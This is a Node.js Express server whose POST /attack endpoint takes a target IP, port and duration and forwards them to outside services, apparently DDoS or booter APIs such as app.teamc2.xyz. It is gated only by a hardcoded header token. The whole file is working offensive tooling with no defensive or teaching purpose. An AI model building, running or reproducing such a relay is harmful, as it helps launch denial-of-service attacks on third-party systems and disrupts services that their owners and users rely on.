// ================= 🔥 GLOBAL ERROR DEBUG =================
process.on("uncaughtException", err => {
  console.error("🔥 UNCAUGHT EXCEPTION:", err);
});

process.on("unhandledRejection", err => {
  console.error("🔥 UNHANDLED PROMISE:", err);
});

// ================= IMPORTS =================
const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();

app.use(cors());
app.use(express.json());

// ================= ENV =================
const API_KEY = process.env.API_KEY;
const PORT = process.env.PORT;

// 🔥 MODE SWITCH
const MODE = process.env.MODE || "teamc2";

console.log("MODE:", MODE);
console.log("API_KEY:", API_KEY ? "Loaded ✅" : "Missing ❌");

// ================= ROUTES =================

app.get("/", (req, res) => res.status(200).send("OK"));

app.post("/attack", async (req, res) => {
  try {
    console.log("➡️ Incoming request");

    // 🔐 basic security (ye rehne de)
    if (req.headers["x-sec"] !== "9xK3pL") {
      return res.status(403).json({ error: "Forbidden" });
    }

    let { ip, port, time } = req.body;

    if (!ip || !port || !time) {
      return res.status(400).json({ error: "Missing params" });
    }

    port = Number(port);
    time = Number(time);

    if (isNaN(port) || isNaN(time)) {
      return res.status(400).json({ error: "Invalid port/time" });
    }

    // ================= 🔥 SWITCH =================

    let response;

    if (MODE === "teamc2") {
      if (!API_KEY) {
        return res.status(500).json({ error: "API key missing" });
      }

      const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;

      console.log("🌐 TEAMC2 CALL");

      response = await axios.get(url, { timeout: 10000 });

    } else if (MODE === "cat") {
      console.log("🌐 CAT API CALL");

      response = await axios.post(
        "https://api-cat-ecru.vercel.app/",
        {
          ip,
          port,
          time
        },
        {
          headers: {
            "Content-Type": "application/json"
          },
          timeout: 10000
        }
      );

    } else {
      return res.status(400).json({ error: "Invalid mode" });
    }

    return res.json({
      success: true,
      data: response.data
    });

  } catch (err) {
    console.error("🔥 ERROR:", err?.response?.data || err.message);

    return res.status(500).json({
      error: err?.response?.data || "Server error"
    });
  }
});

// ================= START =================
if (!PORT) {
  console.error("❌ PORT missing");
  process.exit(1);
}

app.listen(PORT, () => {
  console.log(`🚀 Running on ${PORT}`);
});